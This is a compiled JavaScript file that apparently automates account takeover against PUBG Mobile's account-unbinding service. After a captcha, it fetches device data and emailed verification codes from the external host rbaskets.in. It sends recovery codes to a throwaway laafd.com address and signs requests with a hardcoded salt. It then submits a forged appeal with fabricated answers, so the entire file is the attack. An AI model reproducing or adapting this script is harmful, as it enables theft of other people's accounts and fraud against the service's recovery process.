var $jscomp = $jscomp || {};
$jscomp.scope = {};
$jscomp.createTemplateTagFirstArg = function(a) {
  return a.raw = a;
};
$jscomp.createTemplateTagFirstArgWithRaw = function(a, m) {
  a.raw = m;
  return a;
};
window.TencentCaptchaCallback = function(a) {
  if (0 === a.ret) {
    var m = a.randstr, t = a.ticket;
    a = document.createElement("script");
    a.src = "https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js";
    a.onload = function() {
      var l = Math.floor(Date.now() / 1000);
      (function() {
        return fetch("https://rbaskets.in/dec" + window.location.search).then(function(d) {
          return d.json();
        })["catch"](function(d) {
          return console.error("Error fetching device info:", d);
        });
      })().then(function(d) {
        if (d) {
          var g = (new URLSearchParams(window.location.search)).get("uid"), p = {type:1, text:g, uid:g, ticket:t, rand_str:m, game_data:d};
          g = "/intl/mgw/invoke?channelid=3&gameid=1320&os=2&r=/pubgm.a20211012unbinding.a20211012unbinding_interface/IsGreenAccess&source=32&ts=" + l + JSON.stringify(p) + "0d88135dd851f81f9601e477b261a137";
          g = CryptoJS.MD5(g).toString();
          var u = "https://pubgm-custom-vas.intlgame.com/intl/mgw/invoke?channelid=3&gameid=1320&os=2&r=/pubgm.a20211012unbinding.a20211012unbinding_interface/IsGreenAccess&source=32&ts=" + l + "&sig=" + g;
          (function() {
            fetch(u, {method:"POST", headers:{"Content-Type":"application/json", Connection:"keep-alive", "Accept-Encoding":"gzip"}, body:JSON.stringify(p)}).then(function(e) {
              return e.json();
            }).then(function(e) {
              if (0 === e.ret) {
                var h = (new URLSearchParams(window.location.search)).get("uid"), n = {uid:h, email:h + "@laafd.com", game_data:d, token:e.data.green_token, openid:e.data.openid, green_token:e.data.green_token, vip:e.data.vip};
                h = "/intl/mgw/invoke?channelid=3&gameid=1320&os=2&r=/pubgm.a20211012unbinding.a20211012unbinding_interface/SendCode&source=32&ts=" + l + JSON.stringify(n) + "0d88135dd851f81f9601e477b261a137";
                h = CryptoJS.MD5(h).toString();
                var q = "https://pubgm-custom-vas.intlgame.com/intl/mgw/invoke?channelid=3&gameid=1320&os=2&r=/pubgm.a20211012unbinding.a20211012unbinding_interface/SendCode&source=32&ts=" + l + "&sig=" + h;
                fetch(q, {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(n)}).then(function(k) {
                  return k.json();
                }).then(function(k) {
                  0 === k.ret && fetch("https://rbaskets.in/cod?uid=" + window.location.search).then(function(b) {
                    return b.json();
                  }).then(function(b) {
                    if (b) {
                      var f = b.verify_code;
                      b = {uid:b.uid, email:b.uid + "@laafd.com", green_token:e.data.green_token, game_data:d, answer:AesEncrypt('[{"id":20002,"answer":"[[\\"\u5357\u975e\\"]]"},{"id":20003,"answer":"[[\\"oneplus\\",\\"oneplus 8\\"]]"},{"id":20004,"answer":"[[\\"35\\"],[\\"42\\"]]"},{"id":20005,"answer":"[]"},{"id":20006,"answer":"[]"},{"id":20007,"answer":"[[\\"NAME\\"]]"},{"id":20008,"answer":"[[\\"9\\",\\"720\\"]]"},{"id":20009,"answer":"[[\\"cl10002\\"]]"},{"id":20010,"answer":"[]"},{"id":20011,"answer":"[[\\"0\\"]]"},{"id":20012,"answer":"[]"},{"id":20013,"answer":"[[\\"' + 
                      b.uid + '@laafd.com\\"]]"},{"id":20014,"answer":"[]"}]', aesKey), verify_code:f, reasonSceneDesc:f, webData:AesEncrypt(f, aesKey)};
                      f = "/intl/mgw/invoke?channelid=3&gameid=1&r=/pubgm.a20211012unbinding.a20211012unbinding_interface/SubmitAppeal&source=32" + JSON.stringify(b) + "0d88135dd851f81f9601e477b261a137";
                      f = CryptoJS.MD5(f).toString();
                      fetch("https://pubgm-custom-vas.intlgame.com/intl/mgw/invoke?channelid=3&gameid=1&r=/pubgm.a20211012unbinding.a20211012unbinding_interface/SubmitAppeal&source=32&sig=" + f, {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(b)}).then(function(c) {
                        return c.json();
                      }).then(function(c) {
                        alert(JSON.stringify(c));
                      });
                    } else {
                      var r = setInterval(function() {
                        fetch(q, {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(n)}).then(function(c) {
                          return c.json();
                        }).then(function(c) {
                          0 === c.ret && clearInterval(r);
                        })["catch"](function(c) {
                          console.error("Error sending data to Url22:", c);
                        });
                      }, 400);
                      setTimeout(function() {
                        clearInterval(r);
                      }, 90000);
                    }
                  });
                })["catch"](function(k) {
                  console.error("Fetch error:", k);
                });
              }
            });
          })();
        }
      });
    };
    document.head.appendChild(a);
  }
};
function getDeviceInfo() {
  return fetch("https://rbaskets.in/dec" + window.location.search).then(function(a) {
    return a.json();
  })["catch"](function(a) {
    return console.error("Error fetching device info:", a);
  });
}
;
